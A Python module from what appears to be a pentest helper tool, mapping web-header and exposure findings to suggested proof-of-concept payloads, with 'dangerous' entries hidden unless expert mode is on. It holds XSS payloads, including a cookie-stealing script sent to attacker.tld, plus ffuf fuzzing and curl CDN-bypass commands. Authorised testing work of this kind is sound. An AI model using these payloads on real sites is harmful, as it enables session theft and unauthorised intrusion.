"""
Payload Intelligence Module
---------------------------
Purpose:
- Suggest context-aware PoC payloads
- NO execution
- NO active exploitation
- Safe-by-default (Expert mode hides dangerous payloads)

Pentest & Bug Bounty friendly
"""

from typing import Dict, List

# -------------------------------
# Payload Safety Levels
# -------------------------------
POC_LOW = "LOW"
POC_MEDIUM = "MEDIUM"
POC_HIGH = "HIGH"

# -------------------------------
# Core Payload Database
# Keys MUST match finding_normalizer outputs
# -------------------------------
PAYLOAD_PROFILES: Dict[str, Dict] = {

    # ===========================
    # HEADER MISCONFIGURATIONS
    # ===========================

    "MISSING_CSP": {
        "attack_class": "Cross-Site Scripting (XSS)",
        "risk_level": "High",
        "why_it_works": (
            "Without Content-Security-Policy, the browser allows execution "
            "of injected inline or external JavaScript."
        ),
        "payloads": [
            {
                "payload": "<script>alert(document.domain)</script>",
                "context": "Inline Script",
                "goal": "Basic JavaScript execution PoC",
                "poc_level": POC_LOW,
                "dangerous": False
            },
            {
                "payload": "<img src=x onerror=alert(1)>",
                "context": "Attribute-based XSS",
                "goal": "Filter bypass PoC",
                "poc_level": POC_MEDIUM,
                "dangerous": False
            },
            {
                "payload": "<script>fetch('https://attacker.tld/?c='+document.cookie)</script>",
                "context": "Cookie Exfiltration",
                "goal": "Session theft",
                "poc_level": POC_HIGH,
                "dangerous": True
            }
        ],
        "where_to_test": [
            "Search inputs",
            "Contact forms",
            "URL parameters",
            "HTTP headers (User-Agent, Referer)"
        ],
        "cwe": "CWE-79",
        "owasp": "A03:2021 - Injection"
    },

    "MISSING_HSTS": {
        "attack_class": "SSL Stripping",
        "risk_level": "High",
        "why_it_works": (
            "Without HSTS, the first HTTP request can be downgraded "
            "before HTTPS enforcement."
        ),
        "payloads": [
            {
                "payload": "http://{{TARGET}}",
                "context": "Protocol downgrade",
                "goal": "Demonstrate first-visit MITM risk",
                "poc_level": POC_LOW,
                "dangerous": False
            }
        ],
        "where_to_test": [
            "Public Wi-Fi",
            "First-time visitors"
        ],
        "cwe": "CWE-319",
        "owasp": "A02:2021 - Cryptographic Failures"
    },

    "MISSING_X_FRAME_OPTIONS": {
        "attack_class": "Clickjacking",
        "risk_level": "Medium",
        "why_it_works": (
            "Without X-Frame-Options, the page can be embedded in an iframe "
            "and overlaid with malicious UI elements."
        ),
        "payloads": [
            {
                "payload": "<iframe src='https://{{TARGET}}/login' width='100%' height='800'></iframe>",
                "context": "HTML PoC",
                "goal": "UI redress demonstration",
                "poc_level": POC_LOW,
                "dangerous": False
            }
        ],
        "where_to_test": [
            "Login pages",
            "Admin panels",
            "Payment pages"
        ],
        "cwe": "CWE-1021",
        "owasp": "A05:2021 - Security Misconfiguration"
    },

    "MISSING_X_CONTENT_TYPE_OPTIONS": {
        "attack_class": "MIME Sniffing",
        "risk_level": "Medium",
        "why_it_works": (
            "Without nosniff, browsers may interpret non-script files "
            "as executable JavaScript."
        ),
        "payloads": [
            {
                "payload": "<script src='malicious.jpg'></script>",
                "context": "Content-Type confusion",
                "goal": "Script execution via MIME sniffing",
                "poc_level": POC_MEDIUM,
                "dangerous": False
            }
        ],
        "where_to_test": [
            "File upload endpoints",
            "Static asset hosting"
        ],
        "cwe": "CWE-430",
        "owasp": "A05:2021 - Security Misconfiguration"
    },

    # ===========================
    # ADMIN PANEL EXPOSURE
    # ===========================

    "ADMIN_PANEL_EXPOSED": {
        "attack_class": "Admin Interface Exposure",
        "risk_level": "High",
        "why_it_works": (
            "Publicly reachable admin panels increase the risk of brute-force, "
            "credential stuffing, and logic-based attacks."
        ),
        "payloads": [
            {
                "payload": "GET /admin",
                "context": "Direct access",
                "goal": "Confirm admin interface exposure",
                "poc_level": POC_LOW,
                "dangerous": False
            },
            {
                "type": "command",
                "tool": "ffuf",
                "payload": (
                    "ffuf -u https://{{TARGET}}/FUZZ "
                    "-w /usr/share/wordlists/admin.txt "
                    "-mc 200,301,302,401,403 "
                    "-t 40 -timeout 10"
                ),
                "context": "Directory discovery",
                "goal": "Identify hidden admin paths",
                "poc_level": POC_MEDIUM,
                "dangerous": True
            }
        ],
        "where_to_test": [
            "/admin",
            "/panel",
            "/dashboard",
            "/manage"
        ],
        "cwe": "CWE-284",
        "owasp": "A01:2021 - Broken Access Control"
    },

    # ===========================
    # ORIGIN / BACKEND EXPOSURE
    # ===========================

    "ORIGIN_DIRECT_ACCESS": {
        "attack_class": "CDN / Origin Bypass",
        "risk_level": "High",
        "why_it_works": (
            "Direct access to origin IP bypasses CDN protections such as WAF, "
            "rate limiting, and bot mitigation."
        ),
        "payloads": [
            {
                "payload": "curl -I http://ORIGIN_IP",
                "context": "Direct origin probe",
                "goal": "Confirm origin server exposure",
                "poc_level": POC_LOW,
                "dangerous": False
            },
            {
                "payload": "curl -I http://ORIGIN_IP -H 'Host: {{TARGET}}'",
                "context": "Host header override",
                "goal": "Bypass CDN routing",
                "poc_level": POC_MEDIUM,
                "dangerous": False
            }
        ],
        "where_to_test": [
            "Discovered origin IPs",
            "Historical DNS records",
            "Open backend ports"
        ],
        "cwe": "CWE-668",
        "owasp": "A05:2021 - Security Misconfiguration"
    }
}

# -------------------------------
# Core Engine
# -------------------------------
def suggest_payloads(finding_key: str, expert_mode: bool = False) -> Dict:
    """
    Return payload suggestions for a given finding.
    Dangerous payloads are hidden unless expert_mode=True.
    """
    finding_key = finding_key.upper()

    if finding_key not in PAYLOAD_PROFILES:
        return {}

    profile = PAYLOAD_PROFILES[finding_key]
    visible_payloads: List[Dict] = []
    hidden_count = 0

    for payload in profile["payloads"]:
        if payload.get("dangerous") and not expert_mode:
            hidden_count += 1
            continue
        visible_payloads.append(payload)

    return {
        "attack_class": profile["attack_class"],
        "risk_level": profile["risk_level"],
        "why_it_works": profile["why_it_works"],
        "recommended_payloads": visible_payloads,
        "hidden_payloads_count": hidden_count,
        "where_to_test": profile["where_to_test"],
        "cwe": profile["cwe"],
        "owasp": profile["owasp"],
        "note": "Payloads are suggested for PoC purposes only and were NOT executed."
    }

# -------------------------------
# Helper
# -------------------------------
def available_findings() -> List[str]:
    """Return all supported finding keys."""
    return list(PAYLOAD_PROFILES.keys())

